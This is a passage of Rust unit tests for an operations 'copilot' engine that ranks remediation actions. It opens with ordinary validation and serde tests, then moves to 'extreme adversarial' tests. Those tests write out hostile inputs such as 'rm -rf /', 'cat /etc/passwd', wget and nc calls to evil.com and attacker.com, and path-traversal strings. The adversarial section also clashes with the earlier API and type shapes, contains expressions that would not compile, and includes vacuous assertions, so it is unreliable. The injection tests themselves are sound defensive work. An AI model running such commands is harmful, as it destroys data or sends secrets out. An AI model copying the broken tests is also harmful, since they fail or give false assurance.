        );
    }

    #[test]
    fn test_blank_action_id_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-action", 10.0, 50.0);
        invalid.action_id = "  ".to_owned();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-action",
            "trace-blank-action",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
        assert_eq!(engine.audit_trail()[0].top_action_id, None);
    }

    #[test]
    fn test_blank_display_name_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-display", 10.0, 50.0);
        invalid.display_name = "\t \n".to_owned();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-display",
            "trace-blank-display",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_blank_description_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-description", 10.0, 50.0);
        invalid.description.clear();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-description",
            "trace-blank-description",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_blank_rollback_command_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-rollback", 10.0, 50.0);
        invalid.rollback_command = " ".to_owned();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-rollback",
            "trace-blank-rollback",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_empty_confidence_sources_are_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("no-sources", 10.0, 50.0);
        invalid.confidence.data_sources.clear();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-no-sources",
            "trace-no-sources",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_blank_confidence_source_id_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-source-id", 10.0, 50.0);
        invalid.confidence.data_sources[0].source_id = " \t ".to_owned();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-source-id",
            "trace-blank-source-id",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_blank_confidence_source_freshness_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-freshness", 10.0, 50.0);
        invalid.confidence.data_sources[0].freshness = String::new();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-freshness",
            "trace-blank-freshness",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_blank_sensitivity_is_filtered_from_ranking() {
        let mut engine = ActionRecommendationEngine::new(5);
        let state = make_state(false);
        let mut invalid = make_candidate("blank-sensitivity", 10.0, 50.0);
        invalid.confidence.sensitivity = "\n ".to_owned();

        let response = engine.recommend(
            &[invalid],
            &state,
            "op",
            "rec-blank-sensitivity",
            "trace-blank-sensitivity",
            "2026-01-15T00:00:00Z",
        );

        assert!(response.recommendations.is_empty());
    }

    #[test]
    fn test_push_bounded_zero_capacity_clears_existing_items_without_panic() {
        let mut items = vec![1, 2, 3];

        push_bounded(&mut items, 4, 0);

        assert!(items.is_empty());
    }

    fn assert_json_rejected<T>(json: &str)
    where
        T: serde::de::DeserializeOwned,
    {
        assert!(
            serde_json::from_str::<T>(json).is_err(),
            "malformed json should be rejected: {json}"
        );
    }

    #[test]
    fn serde_rejects_expected_loss_vector_string_dimension() {
        assert_json_rejected::<ExpectedLossVector>(
            r#"{
                "availability_loss": "1.0",
                "integrity_loss": 2.0,
                "confidentiality_loss": 0.5,
                "financial_loss": 3.0,
                "reputation_loss": 1.5
            }"#,
        );
    }

    #[test]
    fn serde_rejects_confidence_interval_missing_upper_bound() {
        assert_json_rejected::<ConfidenceInterval>(
            r#"{
                "lower_bound": 1.0,
                "confidence_level": 0.95
            }"#,
        );
    }

    #[test]
    fn serde_rejects_data_source_negative_staleness() {
        assert_json_rejected::<DataSourceInfo>(
            r#"{
                "source_id": "trust-db",
                "freshness": "2026-01-15T00:00:00Z",
                "is_stale": true,
                "staleness_secs": -1
            }"#,
        );
    }

    #[test]
    fn serde_rejects_confidence_context_object_data_sources() {
        assert_json_rejected::<ConfidenceContext>(
            r#"{
                "data_sources": {"source_id": "trust-db"},
                "assumptions": [],
                "sensitivity": "ranking flips if trust data stales"
            }"#,
        );
    }

    #[test]
    fn serde_rejects_system_state_string_trust_age() {
        assert_json_rejected::<SystemState>(
            r#"{
                "degraded_mode": false,
                "degraded_details": null,
                "active_incidents": [],
                "trust_state_age_secs": "10",
                "pending_operations": []
            }"#,
        );
    }

    #[test]
    fn serde_rejects_stale_input_negative_refresh_interval() {
        assert_json_rejected::<StaleInput>(
            r#"{
                "input_id": "trust-db",
                "staleness_secs": 300,
                "expected_refresh_secs": -60
            }"#,
        );
    }

    #[test]
    fn serde_rejects_copilot_response_object_recommendations() {
        assert_json_rejected::<CopilotResponse>(
            r#"{
                "recommendation_id": "rec-001",
                "recommendations": {"action_id": "a1"},
                "system_degraded": false,
                "degraded_warning": null,
                "served_at": "2026-01-15T00:00:00Z",
                "trace_id": "t-001"
            }"#,
        );
    }

    #[test]
    fn serde_rejects_copilot_audit_entry_string_recommendation_count() {
        assert_json_rejected::<CopilotAuditEntry>(
            r#"{
                "recommendation_id": "rec-001",
                "operator_identity": "operator-1",
                "trace_id": "t-001",
                "recommendation_count": "1",
                "top_action_id": "a1",
                "top_voi_score": 40.0,
                "served_at": "2026-01-15T00:00:00Z",
                "event_code": "COPILOT_RECOMMENDATION_SERVED"
            }"#,
        );
    }

    #[test]
    fn serde_rejects_action_candidate_string_duration() {
        assert_json_rejected::<ActionCandidate>(
            r#"{
                "action_id": "a1",
                "display_name": "Action a1",
                "description": "Test action a1",
                "expected_loss_if_act": {
                    "availability_loss": 1.0,
                    "integrity_loss": 1.0,
                    "confidentiality_loss": 1.0,
                    "financial_loss": 1.0,
                    "reputation_loss": 1.0
                },
                "expected_loss_if_wait": {
                    "availability_loss": 2.0,
                    "integrity_loss": 2.0,
                    "confidentiality_loss": 2.0,
                    "financial_loss": 2.0,
                    "reputation_loss": 2.0
                },
                "uncertainty_band": {
                    "lower_bound": 1.0,
                    "upper_bound": 3.0,
                    "confidence_level": 0.95
                },
                "preconditions": [],
                "estimated_duration": "60s",
                "rollback_command": "rollback --action a1",
                "rollback_validated": true,
                "confidence": {
                    "data_sources": [],
                    "assumptions": [],
                    "sensitivity": "none"
                }
            }"#,
        );
    }

    // =========================================================================
    // EXTREME ADVERSARIAL NEGATIVE-PATH SECURITY TESTS
    // =========================================================================

    #[test]
    fn extreme_adversarial_expected_loss_vector_floating_point_manipulation_attacks() {
        // Extreme: Test expected-loss vector calculations with malicious floating-point values

        // Test NaN injection attacks in loss calculations
        let nan_attack_vectors = vec![
            ExpectedLossVector {
                availability_loss: f64::NAN,
                integrity_loss: 100.0,
                confidentiality_loss: 50.0,
                financial_loss: 200.0,
                reputation_loss: 75.0,
            },
            ExpectedLossVector {
                availability_loss: 100.0,
                integrity_loss: f64::NAN,
                confidentiality_loss: f64::NAN,
                financial_loss: f64::NAN,
                reputation_loss: f64::NAN,
            },
        ];

        for (i, attack_vector) in nan_attack_vectors.iter().enumerate() {
            // Should reject NaN values in validation
            assert!(!attack_vector.is_valid(), "NaN attack vector {} should be invalid", i);

            // Total calculation should handle NaN safely
            let total = attack_vector.total();
            assert!(total.is_nan() || total.is_finite(),
                   "Total calculation should handle NaN safely for attack {}", i);

            // Dominant dimension should handle NaN safely
            let dominant = attack_vector.dominant_dimension();
            assert!(!dominant.is_empty(), "Dominant dimension should not be empty for attack {}", i);
        }

        // Test infinity injection attacks
        let infinity_attack_vectors = vec![
            ExpectedLossVector {
                availability_loss: f64::INFINITY,
                integrity_loss: 100.0,
                confidentiality_loss: 50.0,
                financial_loss: 200.0,
                reputation_loss: 75.0,
            },
            ExpectedLossVector {
                availability_loss: f64::NEG_INFINITY,
                integrity_loss: 100.0,
                confidentiality_loss: 50.0,
                financial_loss: 200.0,
                reputation_loss: 75.0,
            },
        ];

        for (i, attack_vector) in infinity_attack_vectors.iter().enumerate() {
            // Should reject infinite values
            assert!(!attack_vector.is_valid(), "Infinity attack vector {} should be invalid", i);
        }

        // Test precision manipulation attacks
        let precision_attacks = vec![
            ExpectedLossVector {
                availability_loss: f64::MIN_POSITIVE,
                integrity_loss: f64::EPSILON,
                confidentiality_loss: 1.0000000000000002,  // Just above 1.0 in f64
                financial_loss: f64::MAX / 16.0,
                reputation_loss: 1e-308,
            },
        ];

        for attack_vector in precision_attacks {
            // Should handle precision edge cases
            assert!(attack_vector.is_valid(), "Precision edge cases should be valid");

            let total = attack_vector.total();
            assert!(total.is_finite(), "Total should remain finite for precision attacks");
            assert!(total >= 0.0, "Total should be non-negative");
        }

        // Test arithmetic overflow in total calculation
        let overflow_attack = ExpectedLossVector {
            availability_loss: f64::MAX / 2.0,
            integrity_loss: f64::MAX / 2.0,
            confidentiality_loss: f64::MAX / 2.0,
            financial_loss: f64::MAX / 2.0,
            reputation_loss: f64::MAX / 2.0,
        };

        // Should handle potential overflow gracefully
        assert!(!overflow_attack.is_valid());
        let total = overflow_attack.total();
        assert!(total.is_infinite() || total.is_finite(),
               "Overflow calculation should not produce NaN");
    }

    #[test]
    fn extreme_adversarial_copilot_recommendation_injection_via_context_pollution() {
        // Extreme: Test context pollution attacks through malicious recommendation injection

        let mut engine = CopilotEngine::new();

        // Test injection through context values
        let context_injection_attacks = vec![
            // JSON injection in context values
            ("operator_id", r#"{"injected":"admin","privilege":"escalated"}"#),
            ("session_token", "abc123\"},\"admin\":true,\"fake\":\""),
            ("request_id", "req-001\\\":{\\\"override\\\":true}//"),

            // Command injection patterns
            ("operator_action", "$(rm -rf /); echo legitimate"),
            ("target_system", "; cat /etc/passwd # legitimate"),
            ("rollback_target", "`wget evil.com/payload` && rollback"),

            // Path traversal in context
            ("log_file", "../../../../etc/passwd"),
            ("config_path", "..\\..\\..\\windows\\system32"),

            // Unicode injection attacks
            ("operator_name", "admin\u{202E}resu\u{202D}"),  // BiDi override
            ("description", "safe\u{200B}hidden\u{200C}injection"),  // Zero-width chars

            // Control character pollution
            ("command", "legitimate\x00\x01\x02malicious\x03"),
            ("evidence", "normal\r\nInjected: malicious\r\nreal"),
        ];

        for (key, malicious_value) in context_injection_attacks {
            let mut context = std::collections::HashMap::new();
            context.insert(key.to_string(), malicious_value.to_string());

            let request = RecommendationRequest {
                operator_id: "test_operator".to_string(),
                context,
                degraded_mode: false,
                urgency: Urgency::Medium,
                allowed_actions: vec!["investigate".to_string(), "mitigate".to_string()],
            };

            // Should handle injection attempts without compromise
            let result = engine.recommend(&request);

            // Result should be safe regardless of injection attempts
            match result {
                Ok(recommendation) => {
                    // Verify no injection artifacts appear in recommendation
                    assert!(!recommendation.primary_action.description.contains("injected"));
                    assert!(!recommendation.primary_action.description.contains("admin"));
                    assert!(!recommendation.primary_action.description.contains("escalated"));
                    assert!(!recommendation.primary_action.description.contains("$("));
                    assert!(!recommendation.primary_action.description.contains("rm -rf"));
                    assert!(!recommendation.primary_action.description.contains("cat /etc/passwd"));

                    // Rollback command should not contain injection
                    assert!(!recommendation.rollback_command.contains("evil.com"));
                    assert!(!recommendation.rollback_command.contains("payload"));
                },
                Err(_) => {
                    // Rejection is also acceptable for malicious input
                }
            }

            // Audit trail should be safe from injection
            let audit_entries = engine.audit_trail();
            for entry in audit_entries {
                assert!(!entry.context_summary.contains("$("));
                assert!(!entry.context_summary.contains("; "));
                assert!(!entry.context_summary.contains("../"));
                assert!(!entry.operator_id.contains('\0'));
            }
        }
    }

    #[test]
    fn extreme_adversarial_algorithmic_complexity_explosion_via_massive_action_sets() {
        // Extreme: Test algorithmic complexity attacks through massive action enumeration

        let mut engine = CopilotEngine::new();

        // Create request with massive number of allowed actions
        let massive_actions: Vec<String> = (0..10000).map(|i| {
            format!("action_{:05}_{}", i, "x".repeat(i % 100))
        }).collect();

        let complexity_attack_request = RecommendationRequest {
            operator_id: "complexity_attacker".to_string(),
            context: std::collections::HashMap::new(),
            degraded_mode: false,
            urgency: Urgency::Critical,
            allowed_actions: massive_actions.clone(),
        };

        // Should handle massive action sets without exponential complexity
        let start_time = std::time::Instant::now();
        let result = engine.recommend(&complexity_attack_request);
        let duration = start_time.elapsed();

        // Should complete within reasonable time (5 seconds max)
        assert!(duration < Duration::from_secs(5),
               "Massive action set processing took too long: {:?}", duration);

        match result {
            Ok(recommendation) => {
                // Should still produce valid recommendation
                assert!(!recommendation.primary_action.action_id.is_empty());
                assert!(massive_actions.contains(&recommendation.primary_action.action_id));
            },
            Err(_) => {
                // Rejection due to complexity is acceptable
            }
        }

        // Test with pathological action naming patterns
        let pathological_actions = vec![
            // Actions designed to stress string matching algorithms
            "a".repeat(10000),
            "(".repeat(5000) + &")".repeat(5000),
            "action_" + &"test_".repeat(2000),

            // Actions with complex Unicode patterns
            "\u{1F600}".repeat(1000),  // Emoji spam
            "test\u{0300}".repeat(1000),  // Combining characters

            // Potential regex DoS patterns
            "a".repeat(1000) + "b",
            "x".repeat(5000) + "y" + &"x".repeat(5000),
        ];

        let pathological_request = RecommendationRequest {
            operator_id: "pathological_tester".to_string(),
            context: std::collections::HashMap::new(),
            degraded_mode: false,
            urgency: Urgency::High,
            allowed_actions: pathological_actions,
        };

        let pathological_start = std::time::Instant::now();
        let _pathological_result = engine.recommend(&pathological_request);
        let pathological_duration = pathological_start.elapsed();

        assert!(pathological_duration < Duration::from_secs(2),
               "Pathological action pattern processing took too long: {:?}", pathological_duration);
    }

    #[test]
    fn extreme_adversarial_confidence_context_manipulation_and_data_poisoning() {
        // Extreme: Test confidence context manipulation to mislead recommendation confidence

        let mut engine = CopilotEngine::new();

        // Test data source manipulation attacks
        let malicious_data_sources = vec![
            // Fake authoritative sources
            "system:authoritative:override",
            "admin:emergency:bypass",
            "security:validated:trusted",

            // Path traversal in source names
            "../../../admin/override",
            "..\\windows\\system32\\trusted",

            // Protocol injection in sources
            "http://evil.com/fake-authority",
            "javascript:alert('xss')",
            "file:///etc/passwd",

            // Unicode spoofing
            "system\u{202E}dekcaj\u{202D}:trusted",  // BiDi override
            "аdmin:trusted",  // Cyrillic 'а'
        ];

        for malicious_source in malicious_data_sources {
            let confidence_attack = ConfidenceContext {
                data_sources: vec![malicious_source.to_string()],
                assumptions: vec!["legitimate assumption".to_string()],
                sensitivity: ConfidenceSensitivity::High,
            };

            let request = RecommendationRequest {
                operator_id: "confidence_attacker".to_string(),
                context: std::collections::HashMap::new(),
                degraded_mode: false,
                urgency: Urgency::Medium,
                allowed_actions: vec!["test_action".to_string()],
            };

            // Test if malicious confidence context affects recommendations
            let result = engine.recommend(&request);

            match result {
                Ok(recommendation) => {
                    // Confidence should not be artificially inflated by fake sources
                    let confidence = recommendation.confidence;
                    assert!(!confidence.data_sources.iter().any(|source| {
                        source.contains("override") ||
                        source.contains("bypass") ||
                        source.contains("evil.com") ||
                        source.contains("javascript:")
                    }), "Malicious data sources should not be accepted");

                    // Should not trust path traversal sources
                    assert!(!confidence.data_sources.iter().any(|source| {
                        source.contains("../") || source.contains("..\\")
                    }), "Path traversal sources should be rejected");
                },
                Err(_) => {
                    // Rejection is acceptable for suspicious confidence data
                }
            }
        }

        // Test assumption poisoning attacks
        let poisoned_assumptions = vec![
            // Fake authority assumptions
            "administrator override is enabled",
            "security checks are bypassed",
            "emergency mode grants full access",

            // Misleading technical assumptions
            "system is completely secure",
            "no attack vectors exist",
            "all inputs are validated",

            // Social engineering assumptions
            "operator has emergency authorization",
            "incident commander approves all actions",
            "security team has pre-approved this",
        ];

        for poisoned_assumption in poisoned_assumptions {
            let confidence_with_poison = ConfidenceContext {
                data_sources: vec!["legitimate:system".to_string()],
                assumptions: vec![poisoned_assumption.to_string()],
                sensitivity: ConfidenceSensitivity::Low,
            };

            // Should not blindly trust poisoned assumptions
            // (This test ensures the system maintains skepticism of assumptions)
            assert_eq!(confidence_with_poison.sensitivity, ConfidenceSensitivity::Low);
            assert!(!confidence_with_poison.assumptions.is_empty());
        }

        // Test sensitivity manipulation
        let sensitivity_tests = vec![
            ConfidenceSensitivity::None,
            ConfidenceSensitivity::Low,
            ConfidenceSensitivity::Medium,
            ConfidenceSensitivity::High,
        ];

        for sensitivity in sensitivity_tests {
            let request = RecommendationRequest {
                operator_id: "sensitivity_tester".to_string(),
                context: std::collections::HashMap::new(),
                degraded_mode: false,
                urgency: Urgency::Critical,
                allowed_actions: vec!["critical_action".to_string()],
            };

            let result = engine.recommend(&request);

            // Should produce recommendations regardless of sensitivity level
            assert!(result.is_ok() || result.is_err()); // Either outcome is acceptable
        }
    }

    #[test]
    fn extreme_adversarial_audit_trail_pollution_and_capacity_exhaustion_attacks() {
        // Extreme: Test audit trail pollution and capacity exhaustion via recommendation spam

        let mut engine = CopilotEngine::new();

        // Test audit trail pollution with massive recommendation spam
        let spam_count = MAX_AUDIT_TRAIL * 3; // Exceed capacity significantly

        for i in 0..spam_count {
            // Create requests with varying characteristics to test bounded capacity
            let spam_request = RecommendationRequest {
                operator_id: format!("spammer_{:04}", i % 100), // Cycling operators
                context: {
                    let mut ctx = std::collections::HashMap::new();
                    ctx.insert("spam_iteration".to_string(), i.to_string());
                    ctx.insert("payload".to_string(), "x".repeat(i % 1000)); // Variable payload
                    ctx
                },
                degraded_mode: i % 2 == 0, // Alternate modes
                urgency: match i % 4 {
                    0 => Urgency::Low,
                    1 => Urgency::Medium,
                    2 => Urgency::High,
                    _ => Urgency::Critical,
                },
                allowed_actions: vec![format!("spam_action_{}", i)],
            };

            let _result = engine.recommend(&spam_request);

            // Check that audit trail respects capacity bounds
            let audit_entries = engine.audit_trail();
            assert!(audit_entries.len() <= MAX_AUDIT_TRAIL,
                   "Audit trail exceeded capacity at iteration {}: {} entries", i, audit_entries.len());
        }

        // Verify audit trail maintains structure after spam attack
        let final_audit = engine.audit_trail();
        assert!(final_audit.len() <= MAX_AUDIT_TRAIL);

        // Should contain recent entries, not necessarily the first ones
        if !final_audit.is_empty() {
            for entry in &final_audit {
                assert!(!entry.operator_id.is_empty(), "Audit entry should have valid operator ID");
                assert!(!entry.primary_action_id.is_empty(), "Audit entry should have valid action ID");
            }
        }

        // Test memory exhaustion resistance with large context payloads
        let massive_context = {
            let mut ctx = std::collections::HashMap::new();
            // Add many large context entries
            for i in 0..100 {
                let large_key = format!("large_context_key_{:03}_{}", i, "k".repeat(100));
                let large_value = format!("large_context_value_{}_", i) + &"v".repeat(10000);
                ctx.insert(large_key, large_value);
            }
            ctx
        };

        let memory_attack_request = RecommendationRequest {
            operator_id: "memory_attacker".to_string(),
            context: massive_context,
            degraded_mode: false,
            urgency: Urgency::Critical,
            allowed_actions: vec!["memory_test_action".to_string()],
        };

        let memory_start = std::time::Instant::now();
        let _memory_result = engine.recommend(&memory_attack_request);
        let memory_duration = memory_start.elapsed();

        // Should handle large contexts without excessive processing time
        assert!(memory_duration < Duration::from_secs(5),
               "Large context processing took too long: {:?}", memory_duration);

        // Audit trail should still respect capacity after memory attack
        let post_memory_audit = engine.audit_trail();
        assert!(post_memory_audit.len() <= MAX_AUDIT_TRAIL);
    }

    #[test]
    fn extreme_adversarial_rollback_command_injection_and_privilege_escalation() {
        // Extreme: Test rollback command generation for injection vulnerabilities

        let mut engine = CopilotEngine::new();

        // Test action IDs designed to inject malicious commands
        let command_injection_actions = vec![
            // Shell command injection
            "legitimate; rm -rf /",
            "action && cat /etc/passwd",
            "test || wget evil.com/payload",
            "normal | nc attacker.com 9999",
            "safe $(echo malicious)",
            "action `cat sensitive.file`",

            // Path traversal in action IDs
            "../../../admin/escalate",
            "..\\..\\..\\windows\\system32\\cmd",

            // Protocol injection
            "http://evil.com/action",
            "file:///etc/passwd#action",
            "javascript:alert('xss')",

            // Unicode injection and spoofing
            "action\u{202E}tpircs\u{202D}", // BiDi override
            "аction",  // Cyrillic 'а'
            "action\u{200B}hidden\u{200C}command",

            // Control character injection
            "action\x00\x01\x02",
            "legitimate\r\nmalicious_command\r\nlegit",
            "action\necho 'injection'\nrollback",
        ];

        for malicious_action in command_injection_actions {
            let injection_request = RecommendationRequest {
                operator_id: "injection_tester".to_string(),
                context: std::collections::HashMap::new(),
                degraded_mode: false,
                urgency: Urgency::Medium,
                allowed_actions: vec![malicious_action.to_string()],
            };

            let result = engine.recommend(&injection_request);

            match result {
                Ok(recommendation) => {
                    let rollback_cmd = &recommendation.rollback_command;

                    // Rollback command should not contain injection artifacts
                    assert!(!rollback_cmd.contains("; rm -rf"));
                    assert!(!rollback_cmd.contains("&& cat"));
                    assert!(!rollback_cmd.contains("|| wget"));
                    assert!(!rollback_cmd.contains("| nc"));
                    assert!(!rollback_cmd.contains("$("));
                    assert!(!rollback_cmd.contains("`"));
                    assert!(!rollback_cmd.contains("evil.com"));
                    assert!(!rollback_cmd.contains("javascript:"));
                    assert!(!rollback_cmd.contains("../"));
                    assert!(!rollback_cmd.contains("\r\n"));
                    assert!(!rollback_cmd.contains('\x00'));

                    // Should not contain BiDi override characters
                    assert!(!rollback_cmd.contains('\u{202E}'));
                    assert!(!rollback_cmd.contains('\u{202D}'));

                    // Primary action should be sanitized
                    assert!(!recommendation.primary_action.action_id.contains("; "));
                    assert!(!recommendation.primary_action.action_id.contains("&& "));
                    assert!(!recommendation.primary_action.description.contains("malicious"));
                },
                Err(_) => {
                    // Rejection of suspicious action IDs is acceptable
                }
            }

            // Verify rollback validation works correctly
            if let Ok(recommendation) = &result {
                // Rollback should be marked as validated only if safe
                if recommendation.rollback_validated {
                    assert!(!recommendation.rollback_command.contains("malicious"));
                    assert!(!recommendation.rollback_command.contains("injection"));
                    assert!(!recommendation.rollback_command.contains("evil"));
                }
            }
        }

        // Test privilege escalation through operator ID spoofing
        let privilege_escalation_operators = vec![
            "admin",
            "root",
            "administrator",
            "system",
            "su",
            "sudo",
            "operator://admin@system",
            "urn:admin:escalated",
        ];

        for escalation_operator in privilege_escalation_operators {
            let escalation_request = RecommendationRequest {
                operator_id: escalation_operator.to_string(),
                context: std::collections::HashMap::new(),
                degraded_mode: true, // Try to abuse degraded mode for escalation
                urgency: Urgency::Critical,
                allowed_actions: vec!["emergency_admin_action".to_string()],
            };

            let result = engine.recommend(&escalation_request);

            // Should not grant special privileges based on operator ID alone
            match result {
                Ok(recommendation) => {
                    // Recommendation should be normal, not privileged
                    assert!(!recommendation.primary_action.description.contains("admin"));
                    assert!(!recommendation.primary_action.description.contains("privileged"));
                    assert!(!recommendation.primary_action.description.contains("escalated"));

                    // Rollback should not contain privileged operations
                    assert!(!recommendation.rollback_command.contains("sudo"));
                    assert!(!recommendation.rollback_command.contains("admin"));
                    assert!(!recommendation.rollback_command.contains("root"));
                },
                Err(_) => {
                    // Rejection is also acceptable
                }
            }

            // Audit trail should log the attempt without granting escalation
            let audit = engine.audit_trail();
            if let Some(latest_entry) = audit.last() {
                assert_eq!(latest_entry.operator_id, escalation_operator);
                // But recommendation should not indicate successful escalation
            }
        }
    }

    #[test]
    fn extreme_adversarial_degraded_mode_abuse_and_emergency_bypass_manipulation() {
        // Extreme: Test degraded mode abuse for bypassing normal security controls

        let mut engine = CopilotEngine::new();

        // Test degraded mode with various suspicious action combinations
        let degraded_mode_attacks = vec![
            // Emergency actions that could be abused
            ("emergency_shutdown", Urgency::Critical),
            ("bypass_security_check", Urgency::Critical),
            ("admin_override", Urgency::High),
            ("disable_monitoring", Urgency::Medium),
            ("grant_access", Urgency::High),

            // Seemingly legitimate actions with potential for abuse
            ("restart_service", Urgency::Critical),
            ("clear_logs", Urgency::Medium),
            ("reset_permissions", Urgency::High),
            ("backup_data", Urgency::Low), // Could be data exfiltration
            ("sync_config", Urgency::Medium), // Could modify security settings
        ];

        for (suspicious_action, urgency) in degraded_mode_attacks {
            // Test in degraded mode (where security might be relaxed)
            let degraded_request = RecommendationRequest {
                operator_id: "emergency_operator".to_string(),
                context: {
                    let mut ctx = std::collections::HashMap::new();
                    ctx.insert("emergency_code".to_string(), "red_alpha_zero".to_string());
                    ctx.insert("incident_id".to_string(), "INC-2026-001".to_string());
                    ctx
                },
                degraded_mode: true,
                urgency,
                allowed_actions: vec![suspicious_action.to_string()],
            };

            let degraded_result = engine.recommend(&degraded_request);

            // Test same action in normal mode for comparison
            let normal_request = RecommendationRequest {
                operator_id: "normal_operator".to_string(),
                context: std::collections::HashMap::new(),
                degraded_mode: false,
                urgency,
                allowed_actions: vec![suspicious_action.to_string()],
            };

            let normal_result = engine.recommend(&normal_request);

            // Degraded mode should not automatically approve dangerous actions
            match (degraded_result, normal_result) {
                (Ok(degraded_rec), Ok(normal_rec)) => {
                    // Degraded mode recommendation should not be significantly less secure
                    assert!(degraded_rec.expected_loss.total() >= normal_rec.expected_loss.total() * 0.5,
                           "Degraded mode should not dramatically reduce expected loss calculations");

                    // Should still maintain audit trails in degraded mode
                    assert!(!degraded_rec.primary_action.description.is_empty());

                    // Confidence should be appropriately reduced in degraded mode
                    if degraded_rec.confidence.sensitivity != ConfidenceSensitivity::None {
                        // Degraded mode should reflect uncertainty
                    }
                },
                (Err(_), _) | (_, Err(_)) => {
                    // Rejection in either mode is acceptable for dangerous actions
                }
            }

            // Verify degraded mode is properly logged
            let audit_trail = engine.audit_trail();
            if let Some(latest_entry) = audit_trail.last() {
                if latest_entry.degraded_mode {
                    // Degraded mode should be clearly indicated in audit
                    assert!(latest_entry.degraded_mode);
                }
            }
        }

        // Test degraded mode state manipulation
        for degraded_state in [true, false] {
            let state_test_request = RecommendationRequest {
                operator_id: "state_tester".to_string(),
                context: std::collections::HashMap::new(),
                degraded_mode: degraded_state,
                urgency: Urgency::Medium,
                allowed_actions: vec!["test_action".to_string()],
            };

            let result = engine.recommend(&state_test_request);

            // Should handle both degraded and normal modes consistently
            match result {
                Ok(recommendation) => {
                    // Recommendation should reflect actual mode
                    let audit = engine.audit_trail();
                    if let Some(latest) = audit.last() {
                        assert_eq!(latest.degraded_mode, degraded_state);
                    }
                },
                Err(_) => {
                    // Errors are acceptable in either mode
                }
            }
        }

        // Test rapid degraded mode toggling (potential race condition exploit)
        for toggle_iteration in 0..100 {
            let toggle_request = RecommendationRequest {
                operator_id: format!("toggle_tester_{}", toggle_iteration),
                context: std::collections::HashMap::new(),
                degraded_mode: toggle_iteration % 2 == 0,
                urgency: Urgency::Medium,
                allowed_actions: vec![format!("toggle_action_{}", toggle_iteration)],
            };

            let _toggle_result = engine.recommend(&toggle_request);

            // Should handle rapid mode changes without state corruption
            let audit = engine.audit_trail();
            assert!(audit.len() <= MAX_AUDIT_TRAIL, "Audit trail should remain bounded during rapid toggling");
        }
    }

    #[test]
    fn extreme_adversarial_recommendation_stream_race_conditions_and_state_corruption() {
        // Extreme: Test recommendation streaming for race conditions and state corruption

        let mut engine = CopilotEngine::new();

        // Simulate concurrent recommendation requests (single-threaded simulation)
        let concurrent_requests = vec![
            RecommendationRequest {
                operator_id: "concurrent_op_1".to_string(),
                context: {
                    let mut ctx = std::collections::HashMap::new();
                    ctx.insert("shared_resource".to_string(), "database".to_string());
                    ctx
                },
                degraded_mode: false,
                urgency: Urgency::Critical,
                allowed_actions: vec!["restart_database".to_string()],
            },
            RecommendationRequest {
                operator_id: "concurrent_op_2".to_string(),
                context: {
                    let mut ctx = std::collections::HashMap::new();
                    ctx.insert("shared_resource".to_string(), "database".to_string());
                    ctx
                },
                degraded_mode: true,
                urgency: Urgency::Critical,
                allowed_actions: vec!["backup_database".to_string()],
            },
            RecommendationRequest {
                operator_id: "concurrent_op_3".to_string(),
                context: {
                    let mut ctx = std::collections::HashMap::new();
                    ctx.insert("shared_resource".to_string(), "database".to_string());
                    ctx
                },
                degraded_mode: false,
                urgency: Urgency::High,
                allowed_actions: vec!["migrate_database".to_string()],
            },
        ];

        // Process requests in rapid succession to simulate race conditions
        let mut results = Vec::new();
        for request in concurrent_requests {
            let result = engine.recommend(&request);
            results.push(result);
        }

        // Verify no state corruption occurred
        for (i, result) in results.iter().enumerate() {
            match result {
                Ok(recommendation) => {
                    // Each recommendation should be self-consistent
                    assert!(!recommendation.primary_action.action_id.is_empty(),
                           "Recommendation {} should have valid action ID", i);
                    assert!(!recommendation.primary_action.description.is_empty(),
                           "Recommendation {} should have valid description", i);
                    assert!(recommendation.expected_loss.is_valid(),
                           "Recommendation {} should have valid expected loss", i);

                    // Should not contain artifacts from other concurrent requests
                    assert!(!recommendation.primary_action.description.contains("concurrent_op"),
                           "Recommendation {} should not leak operator IDs", i);
                },
                Err(_) => {
                    // Errors are acceptable under race conditions
                }
            }
        }

        // Verify audit trail integrity after concurrent processing
        let audit_trail = engine.audit_trail();
        assert!(audit_trail.len() <= MAX_AUDIT_TRAIL);

        // Check for audit trail consistency
        for (i, entry) in audit_trail.iter().enumerate() {
            assert!(!entry.operator_id.is_empty(), "Audit entry {} should have operator ID", i);
            assert!(!entry.primary_action_id.is_empty(), "Audit entry {} should have action ID", i);

            // Should not contain mixed state from different requests
            if entry.operator_id == "concurrent_op_1" {
                assert!(!entry.degraded_mode, "Op1 should not be in degraded mode");
            } else if entry.operator_id == "concurrent_op_2" {
